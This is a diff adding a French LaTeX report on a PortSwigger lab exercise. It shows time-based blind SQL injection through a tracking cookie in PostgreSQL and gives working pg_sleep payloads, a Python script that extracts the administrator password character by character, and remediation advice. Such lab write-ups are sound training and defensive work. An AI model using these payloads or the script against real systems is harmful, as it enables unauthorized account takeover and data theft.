@@ -1,0 +1,248 @@
+% =====================================================================
+%  Rapport de sécurité - Blind SQL injection (time-based)
+%  Compilation : latexmk -pdf blind-sqli-time-delay.tex
+% =====================================================================
+\documentclass[11pt,a4paper]{article}
+\input{../../templates/preambule.tex}
+
+\begin{document}
+
+\makecover
+  {Blind SQL injection (time-based)}
+  {CWE-89 \textperiodcentered{} OWASP A03\string:2021}
+  {
+    \metarow{Lab}{Blind SQL injection with time delays and information retrieval}
+    \metarow{Classe}{Injection SQL}
+    \metarow{Difficulté}{Practitioner}
+    \metarow{SGBD}{PostgreSQL}
+    \metarow{Plateforme}{PortSwigger Web Security Academy}
+  }
+  {Lucas Fagioli}
+  {3 juin 2026}
+
+% =====================================================================
+\section{Contexte}
+% =====================================================================
+L'application utilise un cookie de suivi \texttt{TrackingId} à des fins
+d'analyse d'audience. La valeur de ce cookie est insérée telle quelle dans une
+requête SQL exécutée côté serveur. Le résultat de la requête n'est jamais
+renvoyé, et la page ne change pas selon que la requête réussit, échoue ou ne
+retourne aucune ligne : l'injection est donc totalement en aveugle.
+
+Comme la requête s'exécute de façon synchrone, on peut déclencher des délais
+conditionnels avec la fonction \texttt{pg\_sleep} de PostgreSQL. La base
+devient alors un oracle binaire : en mesurant le temps de réponse, on répond à
+des questions par oui ou par non, et on exfiltre ainsi le mot de passe de
+l'utilisateur \texttt{administrator} caractère par caractère.
+
+\begin{itemize}
+  \item \textbf{Point d'injection} : le cookie \texttt{TrackingId}.
+  \item \textbf{Objectif} : récupérer le mot de passe de \texttt{administrator}, puis se connecter avec ce compte.
+\end{itemize}
+
+\subsection{Environnement}
+\renewcommand{\arraystretch}{1.3}
+\begin{tabular}{@{}p{0.30\textwidth}p{0.62\textwidth}@{}}
+  \textbf{Système}        & Windows 11 (WSL2 pour le script) \\
+  \textbf{Outil principal}& Burp Suite Community Edition \\
+  \textbf{Navigateur}     & Chromium intégré à Burp (Open Browser) \\
+  \textbf{Cible}          & Instance de lab PortSwigger, URL éphémère \texttt{*.web-security-academy.net} \\
+\end{tabular}
+
+\shot{01-homepage.png}{Page d'accueil de l'application cible.}
+
+% =====================================================================
+\section{Reconnaissance}
+% =====================================================================
+Le point d'injection est repéré en observant le trafic dans Burp, onglet
+\emph{Proxy} puis \emph{HTTP history}. La toute première requête \texttt{GET /}
+ne porte aucun cookie : le serveur n'a pas encore posé de \texttt{TrackingId}.
+
+\shot{02-initial-request-no-cookie.png}{Première requête, sans cookie de suivi.}
+
+Après un rechargement de la page (F5), le navigateur renvoie le cookie qui
+vient d'être posé. La nouvelle requête \texttt{GET /} contient désormais
+l'en-tête :
+
+\begin{lstlisting}
+Cookie: TrackingId=8Yx3hPM9qwq1x5pI; session=ForYtv42qGk8YjQwSoISgLljjxDJAVnO
+\end{lstlisting}
+
+C'est la valeur de \texttt{TrackingId} qui sera détournée pour l'injection.
+
+\shot{03-request-with-tracking-cookie.png}{Requête portant le cookie \texttt{TrackingId}.}
+
+La requête est ensuite envoyée au \emph{Repeater} (clic droit, \emph{Send to
+Repeater}) pour pouvoir modifier et rejouer le cookie à volonté.
+
+% =====================================================================
+\section{Exploitation}
+% =====================================================================
+
+\subsection{Confirmer l'injection par un délai}
+Dans le \emph{Repeater}, la valeur du cookie est remplacée par une charge
+utile qui ferme la chaîne SQL (\texttt{'}), enchaîne une seconde instruction
+(\texttt{;}, encodée \texttt{\%3B}) et force un délai côté serveur :
+
+\begin{lstlisting}
+Cookie: TrackingId=x'%3BSELECT+pg_sleep(10)--; session=...
+\end{lstlisting}
+
+La réponse revient après une dizaine de secondes au lieu d'être immédiate, ce
+qui prouve que la valeur du cookie est bien exécutée comme du SQL par
+PostgreSQL. L'injection en aveugle par délai temporel est confirmée.
+
+\shot{04-pg-sleep-delay-proof.png}{Délai d'environ 10 secondes provoqué par \texttt{pg\_sleep}.}
+
+\subsection{Vérifier que l'utilisateur administrateur existe}
+Une charge conditionnelle ne déclenche le délai que si une ligne dont
+\texttt{username='administrator'} existe dans la table \texttt{users} :
+
+\begin{lstlisting}
+Cookie: TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')
++THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--; session=...
+\end{lstlisting}
+
+La réponse met environ 10 secondes : l'utilisateur \texttt{administrator}
+existe donc.
+
+\shot{05-administrator-exists-delay.png}{Condition vraie, délai d'environ 10 secondes.}
+
+Contre-épreuve : avec un nom inexistant (\texttt{username='test'}), la
+condition est fausse, \texttt{pg\_sleep(0)} s'exécute et la réponse est
+immédiate. Le contraste entre le cas vrai (lent) et le cas faux (rapide)
+confirme que l'on maîtrise la logique de la requête.
+
+\shot{06-control-test-instant.png}{Condition fausse, réponse immédiate (contre-épreuve).}
+
+\subsection{Déterminer la longueur du mot de passe}
+La longueur est trouvée par recherche dichotomique sur
+\texttt{LENGTH(password)}. Test "supérieur à 20" :
+
+\begin{lstlisting}
+x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>20)
++THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+\end{lstlisting}
+
+La réponse est immédiate (environ 41 ms) : la condition est fausse, le mot de
+passe fait donc 20 caractères ou moins.
+
+\shot{07-password-length-gt20-false.png}{\texttt{LENGTH(password) > 20} est faux : réponse immédiate.}
+
+Confirmation "égal à 20" :
+
+\begin{lstlisting}
+x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)=20)
++THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+\end{lstlisting}
+
+La réponse met environ 10 secondes : la longueur du mot de passe est
+exactement de 20 caractères.
+
+\shot{08-password-length-eq20-true.png}{\texttt{LENGTH(password) = 20} est vrai : délai d'environ 10 secondes.}
+
+\subsection{Extraire le mot de passe caractère par caractère}
+Pour chaque position i de 1 à 20, chaque caractère candidat c est testé.
+Celui qui déclenche le délai (\texttt{pg\_sleep}) est le bon :
+
+\begin{lstlisting}
+...AND+SUBSTRING(password,i,1)='c'...      (delai si vrai)
+\end{lstlisting}
+
+Faire 20 positions fois une trentaine de caractères à la main n'est pas
+réaliste : l'extraction est automatisée par un script Python qui mesure le
+temps de réponse de chaque requête pour reconstituer le mot de passe.
+
+\begin{lstlisting}[language=Python]
+#!/usr/bin/env python3
+"""
+Extraction du mot de passe 'administrator' par injection SQL en aveugle (delai).
+Lab PortSwigger : Blind SQL injection with time delays and information retrieval.
+Point d'injection : cookie TrackingId (PostgreSQL).
+"""
+import requests
+import string
+import time
+from urllib.parse import quote
+
+URL = "https://<lab-id>.web-security-academy.net/"
+CHARSET = string.ascii_lowercase + string.digits  # mots de passe PortSwigger : [a-z0-9]
+LENGTH = 20        # longueur trouvee a l'etape precedente
+SLEEP = 3          # delai (secondes) injecte via pg_sleep
+THRESHOLD = 2.5    # seuil de detection du delai
+
+password = ""
+for pos in range(1, LENGTH + 1):
+    for c in CHARSET:
+        sql = (
+            "x';SELECT CASE WHEN "
+            f"(username='administrator' AND SUBSTRING(password,{pos},1)='{c}') "
+            f"THEN pg_sleep({SLEEP}) ELSE pg_sleep(0) END FROM users--"
+        )
+        cookie = "TrackingId=" + quote(sql, safe="")
+        t0 = time.time()
+        requests.get(URL, headers={"Cookie": cookie})
+        if time.time() - t0 > THRESHOLD:   # condition vraie : caractere trouve
+            password += c
+            print(f"[{pos:2d}/{LENGTH}] {password}")
+            break
+
+print("\n[+] Mot de passe administrator :", password)
+\end{lstlisting}
+
+Résultat :
+
+\begin{lstlisting}
+[+] Administrator password: f5wav4ixgrwzc5833mar
+\end{lstlisting}
+
+\shot{09-password-extracted.png}{Sortie du script : mot de passe reconstitué.}
+
+\subsection{Résolution du lab}
+Connexion sur \texttt{/login} avec les identifiants récupérés
+(\texttt{administrator} / \texttt{f5wav4ixgrwzc5833mar}).
+
+\shot{10-login-as-administrator.png}{Connexion en tant qu'administrateur.}
+
+La connexion réussit et le lab affiche la bannière verte "Congratulations,
+you solved the lab !", ce qui démontre la compromission du compte
+\texttt{administrator}.
+
+\shot{11-lab-solved.png}{Lab résolu, bannière verte.}
+
+% =====================================================================
+\section{Impact}
+% =====================================================================
+Bien que l'application ne renvoie ni donnée ni message d'erreur (l'injection
+est entièrement en aveugle), la seule capacité à déclencher un délai
+conditionnel suffit à transformer la base en oracle binaire et à exfiltrer
+n'importe quelle information, un bit à la fois.
+
+\begin{itemize}
+  \item \textbf{Confidentialité} : le mot de passe de \texttt{administrator} a été extrait et le compte pris en main. La même technique permet de lire toute la table \texttt{users}, et plus généralement toute donnée accessible au compte de base de données de l'application (autres tables, métadonnées, version du SGBD).
+  \item \textbf{Vecteur trivial} : l'attaque ne demande aucune authentification. Un simple cookie de suivi manipulable suffit.
+  \item \textbf{Gravité} : élevée. Le point d'entrée est un champ analytique d'apparence anodine, ce qui le rend facile à manquer lors d'une revue.
+\end{itemize}
+
+Gravité indicative (aucune authentification, fort impact sur la
+confidentialité) : plage "élevée", à ajuster selon l'étendue réelle de
+la base et de ses privilèges.
+
+% =====================================================================
+\section{Remédiation}
+% =====================================================================
+La cause racine est la concaténation de la valeur du cookie dans la requête
+SQL.
+
+\begin{itemize}
+  \item \textbf{Correctif principal} : utiliser des requêtes paramétrées (marqueurs liés) ou un ORM qui paramètre par défaut. La valeur ne doit jamais être interprétée comme du code. Avec une requête préparée, \texttt{x';SELECT pg\_sleep(10){-}{-}} n'est qu'une chaîne inerte comparée à une valeur.
+  \item \textbf{Moindre privilège} : le compte PostgreSQL de l'application ne doit disposer que des accès strictement nécessaires, sans pouvoir lire \texttt{users} depuis le contexte analytique ni appeler de fonctions inutiles.
+  \item \textbf{Validation des entrées} : un \texttt{TrackingId} a un format attendu (alphanumérique, longueur fixe). Tout ce qui ne correspond pas doit être rejeté.
+  \item \textbf{Surveillance et journalisation} : ne pas exposer les erreurs SQL ; journaliser et alerter sur les requêtes anormales (temps d'exécution, motifs d'injection).
+  \item Un pare-feu applicatif (WAF) peut servir de couche supplémentaire, jamais de remplacement du correctif applicatif.
+\end{itemize}
+
+\vspace{4pt}
+\noindent\emph{Référence} : OWASP SQL Injection Prevention Cheat Sheet ; CWE-89.
+
+\end{document}
